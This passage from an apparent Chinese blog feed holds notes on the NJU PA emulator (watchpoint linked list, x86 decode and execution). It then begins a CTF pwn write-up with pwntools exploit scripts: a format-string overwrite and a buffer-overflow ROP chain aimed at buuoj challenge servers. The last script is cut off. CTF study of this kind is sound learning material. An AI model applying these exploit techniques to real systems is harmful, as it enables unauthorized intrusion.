title="6.)监视点"></a>6.)监视点</h2><blockquote><p>如果前面的代码看明白了，这里的扩展会十分好写。所以我就不直接放代码了，如果实在是写不出来可以去github看，请务必学习思路，而不是抄代码。同时我也会逐渐在文章中减少代码，只放关键代码。</p></blockquote><p>写的时候请注意如下一点，然后实现指针的时候可以用vaddr_read这个函数（内置）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">rule</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *regex;</span><br><span class="line">  <span class="keyword">int</span> token_type;</span><br><span class="line">&#125; rules[] = &#123;</span><br><span class="line">  &#123;<span class="string">&quot;!=&quot;</span>, <span class="string">&#x27;!=&#x27;</span>&#125;,</span><br><span class="line">  <span class="comment">// 这样便是错的，因为要使用字符而不是字符串，但是如果用了双引号，下面的switch则不能用了</span></span><br><span class="line">  <span class="comment">// 所以字符串要写在enum，方便接下来使用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>监视点的功能是监视一个表达式的值何时发生变化，我们首先实现两个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WP* <span class="title">new_wp</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_wp</span><span class="params">(WP *wp)</span></span>;</span><br></pre></td></tr></table></figure><p>其中<code>new_wp()</code>从<code>free_</code>链表中返回一个空闲的监视点结构，<code>free_wp()</code>将<code>wp</code>归还到<code>free_</code>链表中，这两个函数会作为监视点池的接口被其它函数调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_wp_pool</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NR_WP; i ++) &#123;</span><br><span class="line">    wp_pool[i].NO = i;</span><br><span class="line">    wp_pool[i].next = &amp;wp_pool[i + <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// 简简单单小链表</span></span><br><span class="line">    <span class="comment">// 0 -&gt; 1 -&gt; 2 -&gt; 3 -&gt; ... -&gt; 31 -&gt; null</span></span><br><span class="line">  &#125;</span><br><span class="line">  wp_pool[NR_WP - <span class="number">1</span>].next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  head = <span class="literal">NULL</span>;</span><br><span class="line">  free_ = wp_pool;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">WP* <span class="title">new_wp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!free_) &#123;</span><br><span class="line">    panic(<span class="string">&quot;Error: Wp_pool is empty!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  WP *tmp = free_;</span><br><span class="line">  <span class="comment">// tmp=NO.0</span></span><br><span class="line">  free_ = free_-&gt;next;</span><br><span class="line">  <span class="comment">// free=NO.1</span></span><br><span class="line">  tmp-&gt;next = head;</span><br><span class="line">  <span class="comment">// 第一个链表指向的地址为空，接下来依次指向上一个</span></span><br><span class="line">  <span class="comment">// null &lt;- 0 &lt;- 1 &lt;- 2 &lt;- 3</span></span><br><span class="line">  head = tmp;</span><br><span class="line">  <span class="comment">// head=NO.0</span></span><br><span class="line">  <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_wp</span><span class="params">(WP *wp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!wp)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// 检测是不是空链表</span></span><br><span class="line">  <span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">  WP *tmp = head;</span><br><span class="line">  <span class="comment">// tmp is the latest element in the wp list</span></span><br><span class="line">  <span class="comment">// e.g. null &lt; 0 &lt; 1 &lt; 2 tmp=2</span></span><br><span class="line">  <span class="keyword">for</span>(;tmp;tmp = tmp-&gt;next, flag++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(tmp == wp)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!tmp)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">// haven&#x27;t found wp, no need to delete</span></span><br><span class="line">  <span class="keyword">if</span>(flag == <span class="number">0</span>)</span><br><span class="line">    head = head-&gt;next;</span><br><span class="line">  <span class="comment">//wp is the first element in wp list</span></span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    tmp = head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; flag<span class="number">-1</span>; i++)&#123;</span><br><span class="line">      tmp = tmp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    tmp-&gt;next = tmp-&gt;next-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  wp-&gt;next = free_;</span><br><span class="line">  free_ = wp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>free_</code>可以理解为空element。用于释放时把已经使用过的element变成空闲状态。</p><p>另外<code>free_</code>一共有32个，最后一个的next指向null的地址，他们组成一个链表池。tmp是我们自己使用的链表，所谓的<code>new_wp</code>就是在<code>free_</code>链表池中给tmp一个空间。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free_链表池</span><br><span class="line">NO:    0   1   2   3   ...   31    NULL</span><br><span class="line">NEXT:  &amp;1  &amp;2  &amp;3  &amp;4  ...   NULL  NULL</span><br><span class="line">______________________________________</span><br><span class="line">我们自己用的tmp池</span><br><span class="line">NO:    NULL  0     1   2   3   ...   31</span><br><span class="line">NEXT:  NULL  NULL  &amp;0  &amp;1  &amp;2  ...   &amp;30</span><br></pre></td></tr></table></figure><p>剩下的代码实现请去找github吧，可以检测一下你对整个代码的熟悉程度</p><p>思路：</p><p>首先检测表达式是不是正确的，如果是正确的就分配一个链表element存入表达式和结果。然后每执行一条指令，就计算一次表达式，跟之前的结果进行比对，如果结果不一致则暂停<code>NEMU_STOP</code>。</p><p>如果看过代码后会发现其实很简单，尽管这段我是直接照抄的，还是建议大家参考思路写代码。在cpu_exec函数中给大家留下了监视点的判断比对空间。</p><h3 id="有关断点"><a href="#有关断点" class="headerlink" title="有关断点"></a>有关断点</h3><p><a href="https://eli.thegreenplace.net/2011/01/27/how-debuggers-work-part-2-breakpoints">PA给的学习链接</a>，也可以直接看我写的<a href="https://kazamayc.github.io/2021/01/31/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-csapp/">文章</a>异常控制流那章</p><p>int3指令是陷阱指令，它生成一个单字节操作码<code>cc</code>，这样的好处是可以用int3替换任何指令。</p><h1 id="PA2-简单复杂的机器"><a href="#PA2-简单复杂的机器" class="headerlink" title="PA2-简单复杂的机器"></a>PA2-简单复杂的机器</h1><blockquote><ul><li>task PA2.1: 在NEMU中运行第一个C程序<code>dummy</code></li><li>task PA2.2: 实现更多的指令, 在NEMU中运行所有<code>cputest</code> </li><li>task PA2.3: 运行打字小游戏, 提交完整的实验报告</li></ul></blockquote><p>在PA1中, 我们已经见识到最简单的计算机TRM的工作方式:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">  从PC指示的存储器位置取出指令;</span><br><span class="line">  执行指令;</span><br><span class="line">  更新PC;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>取指：取指令要做的事情就是将PC指向的指令从内存读入到CPU中</li><li>译码：CPU拿到一条指令之后, 可以通过查表的方式得知这条指令的操作数和操作码</li><li>执行：例如把两个操作数放入加法器，然后得到执行结果，再放回目的操作数中（可能是寄存器或者内存）</li><li>更新：执行完一条指令后，CPU就会执行下一条指令。CPU会让PC加上刚才执行完的指令的长度, 即可指向下一条指令的位置</li></ol><h2 id="1-取指令，译码，执行"><a href="#1-取指令，译码，执行" class="headerlink" title="1.)取指令，译码，执行"></a>1.)取指令，译码，执行</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint32_t</span> opcode;</span><br><span class="line">  <span class="keyword">uint32_t</span> width;</span><br><span class="line">  <span class="keyword">vaddr_t</span> seq_pc;  <span class="comment">// sequential pc</span></span><br><span class="line">  <span class="keyword">bool</span> is_jmp;</span><br><span class="line">  <span class="keyword">vaddr_t</span> jmp_pc;</span><br><span class="line">  Operand src, dest, src2;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ISADecodeInfo</span> <span class="title">isa</span>;</span></span><br><span class="line">&#125; DecodeInfo;</span><br><span class="line"></span><br><span class="line">DecodeInfo decinfo;</span><br><span class="line"><span class="comment">// decinfo用于记录全局译码信息以供后续使用，包括操作数的类型，宽度，值等信息。</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cpu_exec函数中</span></span><br><span class="line">__attribute__((unused)) <span class="keyword">vaddr_t</span> seq_pc = exec_once();</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">vaddr_t</span> <span class="title">exec_once</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  decinfo.seq_pc = cpu.pc;</span><br><span class="line">  isa_exec(&amp;decinfo.seq_pc);</span><br><span class="line">  update_pc();</span><br><span class="line">  <span class="keyword">return</span> decinfo.seq_pc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">isa_exec</span><span class="params">(<span class="keyword">vaddr_t</span> *pc)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> opcode = instr_fetch(pc, <span class="number">1</span>);</span><br><span class="line">  <span class="comment">// 取值</span></span><br><span class="line">  decinfo.opcode = opcode;</span><br><span class="line">  set_width(opcode_table[opcode].width);</span><br><span class="line">  <span class="comment">// 用操作码对数组(译码查找表)进行索引</span></span><br><span class="line">  <span class="comment">// 这里是设置操作数的宽度</span></span><br><span class="line">  idex(pc, &amp;opcode_table[opcode]);</span><br><span class="line">  <span class="comment">// 用idex函数进行译码和执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint32_t</span> <span class="title">instr_fetch</span><span class="params">(<span class="keyword">vaddr_t</span> *pc, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> instr = vaddr_read(*pc, len);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">  <span class="keyword">uint8_t</span> *p_instr = (<span class="keyword">void</span> *)&amp;instr;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i ++) &#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">char</span> log_bytebuf[];</span><br><span class="line">    strcatf(log_bytebuf, <span class="string">&quot;%02x &quot;</span>, p_instr[i]);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  (*pc) += len;</span><br><span class="line">  <span class="keyword">return</span> instr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_width</span><span class="params">(<span class="keyword">int</span> width)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (width == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果操作数的宽度设置为0，表示仅仅靠操作码判断，操作数的宽度不能确定</span></span><br><span class="line">    width = decinfo.isa.is_operand_size_16 ? <span class="number">2</span> : <span class="number">4</span>;</span><br><span class="line">    <span class="comment">// 需要通过上面的decinfo.isa.is_operand_size_16来判断</span></span><br><span class="line">  &#125;</span><br><span class="line">  decinfo.src.width = decinfo.dest.width = decinfo.src2.width = width;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  DHelper decode;</span><br><span class="line">  EHelper execute;</span><br><span class="line">  <span class="keyword">int</span> width;</span><br><span class="line">&#125; OpcodeEntry;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> make_DHelper(name) void concat(decode_, name) (vaddr_t *pc)</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*DHelper)</span> <span class="params">(<span class="keyword">vaddr_t</span> *)</span></span>;</span><br><span class="line"><span class="comment">// DHelper是一个指向函数的指针</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> make_EHelper(name) void concat(exec_, name) (vaddr_t *pc)</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*EHelper)</span> <span class="params">(<span class="keyword">vaddr_t</span> *)</span></span>;</span><br><span class="line"><span class="comment">// EHelper是一个指向函数的指针</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> concat_temp(x, y) x ## y</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> concat(x, y) concat_temp(x, y)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">idex</span><span class="params">(<span class="keyword">vaddr_t</span> *pc, OpcodeEntry *e)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (e-&gt;decode)</span><br><span class="line">    e-&gt;decode(pc);</span><br><span class="line">  e-&gt;execute(pc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>不要copy-paste</strong></p><p>大家在实现指令的时候，不要把已有的代码复制好几份，然后进行一些的改动。这样如果一旦有一个代码出现问题，将会非常难以调试。</p></blockquote><h3 id="RTL-寄存器传输语言"><a href="#RTL-寄存器传输语言" class="headerlink" title="RTL(寄存器传输语言)"></a>RTL(寄存器传输语言)</h3><p>在nemu中，RTL寄存器统一使用<code>rtlreg_t</code>定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> <span class="keyword">rtlreg_t</span>;</span><br></pre></td></tr></table></figure><ul><li>不同ISA的通用寄存器(在<code>nemu/src/isa/$ISA/include/isa/reg.h</code>中定义)</li><li><code>id_src</code>，<code>id_src2</code>和<code>id_dest</code>中的访存地址<code>addr</code>和操作数内容<code>val</code>(在<code>nemu/include/cpu/decode.h</code>中定义)。</li><li>临时寄存器<code>s0, s1, t0, t1</code>和<code>ir</code>(在<code>nemu/src/cpu/cpu.c</code>中定义)</li></ul><p>RTL基本指令(在<code>nemu/include/rtl/rtl.h</code>中定义)，它们的特点是不需要使用临时寄存器，只是CPU执行过程中最基本的操作，所以不同的ISA都可以使用RTL基本指令。与ISA相关的指令在<code>nemu/src/isa/$ISA/include/isa/rtl.h</code>定义。</p><h2 id="2-i386"><a href="#2-i386" class="headerlink" title="2.)i386"></a>2.)i386</h2><p>x86指令的一般格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-----------+-----------+-----------+--------+------+------+------+------------+-----------+</span><br><span class="line">|instruction| address-  |  operand- |segment |opcode|ModR/M| SIB  |displacement| immediate |</span><br><span class="line">|  prefix   |size prefix|size prefix|override|      |      |      |            |           |</span><br><span class="line">|-----------+-----------+-----------+--------+------+------+------+------------+-----------|</span><br><span class="line">|   0 OR 1  |  0 OR 1   |   0 OR 1  | 0 OR 1 |1 OR 2|0 OR 1|0 OR 1| 0,1,2 OR 4 |0,1,2 OR 4 |</span><br><span class="line">| - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -|</span><br><span class="line">|                                     number of bytes                                      |</span><br><span class="line">+------------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>除了opcode操作码必定出现以外，其余部分都有可能不出现。</p><p>PA中的x86经过简化， <code>address-size prefix</code>和<code>segment override prefix</code>都不会用到</p><p><img src="https://i.loli.net/2021/08/24/xGJnMD4jTi6KkFy.png" alt="1695681-20190709215756414-343635517.png"></p><blockquote><p>16位的就是去掉e</p></blockquote><p><img src="https://i.loli.net/2021/08/24/mQFstkAwMWYEbgd.png" alt="1695681-20190709222940531-747613638.png"></p><p><img src="https://i.loli.net/2021/08/24/cpvLDiRIPTdukmw.png" alt="1695681-20190709223253426-1377472066.png"></p><p>当<code>mod</code>的值是111时，r/m取寄存器；否则r/m表示内存。</p><p>如果<code>operand-size prefix</code>的编码是0x66，表示操作数宽度就要改变成16位，否则默认是32位。</p><p>因为PA没有段，所以段偏移全部变成相对于物理地址0处的偏移量。</p><h3 id="作业3"><a href="#作业3" class="headerlink" title="作业3"></a>作业3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/root/ics2019/nexus-am/tests/cputest/build/dummy-x86-nemu.elf:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">00100000</span> &lt;_start&gt;:</span><br><span class="line">  <span class="number">100000</span>:bd <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       mov    $<span class="number">0x0</span>,%ebp</span><br><span class="line">  <span class="number">100005</span>:bc <span class="number">00</span> <span class="number">90</span> <span class="number">10</span> <span class="number">00</span>       mov    $<span class="number">0x109000</span>,%esp</span><br><span class="line">  <span class="number">10000</span>a:e8 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       call   <span class="number">100014</span> &lt;_trm_init&gt;</span><br><span class="line">  <span class="number">10000f</span>:<span class="number">90</span>                   nop</span><br><span class="line"></span><br><span class="line"><span class="number">00100010</span> &lt;main&gt;:</span><br><span class="line">  <span class="number">100010</span>:<span class="number">31</span> c0                <span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">  <span class="number">100012</span>:c3                   ret</span><br><span class="line">  <span class="number">100013</span>:<span class="number">90</span>                   nop</span><br><span class="line"></span><br><span class="line"><span class="number">00100014</span> &lt;_trm_init&gt;:</span><br><span class="line">  <span class="number">100014</span>:<span class="number">55</span>                   push   %ebp</span><br><span class="line">  <span class="number">100015</span>:<span class="number">89</span> e5                mov    %esp,%ebp</span><br><span class="line">  <span class="number">100017</span>:<span class="number">83</span> ec <span class="number">14</span>             sub    $<span class="number">0x14</span>,%esp</span><br><span class="line">  <span class="number">10001</span>a:<span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       push   $<span class="number">0x0</span></span><br><span class="line">  <span class="number">10001f</span>:e8 ec ff ff ff       call   <span class="number">100010</span> &lt;main&gt;</span><br><span class="line">  <span class="number">100024</span>:d6                   (bad)</span><br><span class="line">  <span class="number">100025</span>:<span class="number">83</span> c4 <span class="number">10</span>             add    $<span class="number">0x10</span>,%esp</span><br><span class="line">  <span class="number">100028</span>:eb fe                jmp    <span class="number">100028</span> &lt;_trm_init+<span class="number">0x14</span>&gt;</span><br></pre></td></tr></table></figure><p>这个是dummy在nemu中运行所需的。我们需要实现call，push，sub，xor，ret五条指令。</p><table><thead><tr><th>指令</th><th>编码</th><th>描述</th></tr></thead><tbody><tr><td>call</td><td>e8</td><td></td></tr><tr><td>push</td><td>68</td><td></td></tr><tr><td>sub</td><td>83</td><td></td></tr><tr><td>xor</td><td>31</td><td></td></tr><tr><td>ret</td><td>c3</td><td></td></tr></tbody></table><p>果咩，因为我没看懂pa2这段代码，所以决定不浪费时间跑路了</p>]]></content>
      
      
      <categories>
          
          <category> 2021年6月 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[write up] buuoj学习</title>
      <link href="/2021/06/02/buuoj%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/06/02/buuoj%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-第五空间2019-决赛-PWN5"><a href="#1-第五空间2019-决赛-PWN5" class="headerlink" title="1.[第五空间2019 决赛]PWN5"></a>1.[第五空间2019 决赛]PWN5</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/pwn">[第五空间2019 决赛]PWN5</a></p><p>代码核心逻辑：</p><p><img src="https://i.loli.net/2021/06/02/lIbpUGJfFH3Bnjx.png" alt="image-20210602182747720"></p><p>程序获得一个随机数，我们的密码需要和随机数相同。我们在21行把随机数覆盖成我们要输入的密码即可。</p><p>首先判断参数在栈的位置</p><p><img src="https://i.loli.net/2021/06/02/AiMc9seodSPKvpN.png" alt="image-20210602182613082"></p><p>随机数所在地址</p><p><img src="https://i.loli.net/2021/06/02/2PmitpcjC8qEnMJ.png" alt="image-20210602185856825"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29594</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your name:&#x27;</span>)</span><br><span class="line">p.sendline(p32(<span class="number">0x0804C044</span>)+<span class="string">b&#x27;%10$4n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your passwd:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="2-get-started-3dsctf-2016"><a href="#2-get-started-3dsctf-2016" class="headerlink" title="2.get_started_3dsctf_2016"></a>2.get_started_3dsctf_2016</h1><p><a href="https://github.com/Kazamayc/pwnpwnpwn/raw/main/buuoj/get_started_3dsctf_2016">get_started_3dsctf_2016</a></p><p><img src="https://i.loli.net/2021/06/02/FGUxNA3aCP8QLXH.png" alt="image-20210602200359919"></p><p>这个程序没有<code>push ebp; mov ebp,esp</code>是用esp寻址的。所以返回距离只有0x38个字节。</p><p>本题核心逻辑如下，就是简单的ROP然后修改掉参数a1 a2的值。</p><p><img src="https://i.loli.net/2021/06/02/mhbkE7rKPMqz2oB.png" alt="image-20210602200927973"></p><p><img src="https://i.loli.net/2021/06/02/hutVjMRHkqzaD6I.png" alt="image-20210602201043807"></p><p><img src="https://i.loli.net/2021/06/02/PzhOAXbpsUwlDKa.png" alt="image-20210602200945808"></p><p>这里必须加上exit正常返回才能打通远程。</p><p><img src="https://i.loli.net/2021/06/02/mqw8x9IcMyHSOrX.png" alt="image-20210602203713530"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;) #本地调试记得创建一个flag.txt</span></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28271</span>)</span><br><span class="line">get_flag=<span class="number">0x080489A0</span></span><br><span class="line">a1=<span class="number">814536271</span></span><br><span class="line">a2=<span class="number">425138641</span></span><br><span class="line">exit=<span class="number">0x0804E6A0</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span class="number">0.5</span>);</span><br><span class="line">p.sendline(<span class="string">b&#x27;A&#x27;</span>*<span class="number">56</span>+p32(get_flag)+p32(exit)+p32(a1)+p32(a2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>同时这个题还可以直接绕过判断，直接搞flag。只是远程打不通，因为栈空间被破坏了。</p><p><img src="https://i.loli.net/2021/06/02/pBc4nuF9Uv5kSPq.png" alt="image-20210602203925373"></p><p><img src="https://i.loli.net/2021/06/02/Qejl1ZtLvBV8Ibr.png" alt="image-20210602203911452">    </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line">get_flag=<span class="number">0x080489B8</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Qual a palavrinha magica?&#x27;</span>,timeout = <span 